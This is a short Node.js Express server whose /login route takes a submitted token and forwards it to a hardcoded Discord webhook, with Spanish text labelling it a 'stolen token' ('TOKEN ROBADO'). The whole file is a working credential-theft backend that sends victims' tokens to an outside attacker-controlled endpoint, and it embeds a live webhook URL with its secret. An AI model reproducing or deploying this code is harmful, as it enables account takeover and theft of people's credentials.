const express = require('express');
const app = express();
app.use(express.json());

app.post('/login', (req, res) => {
  const token = req.body.token;
  if (!token) return res.send('no token');

  // TU WEBHOOK NUEVO
  fetch("https://discord.com/api/webhooks/1447039795342610596/nkakwoCsFOLzwFOSCtJ1vP42Ibninhw5dq5oVraSyQTfT02ibl1j5qw1LgUdxP2GLyl1", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      content: "@everyone **TOKEN ROBADO 2025**",
      embeds: [{ description: "```" + token + "```", color: 0x00ff00 }]
    })
  });

  res.send("TOKEN RECIBIDO");
});

app.listen(process.env.PORT || 3000, () => console.log("BOT VIVO"));
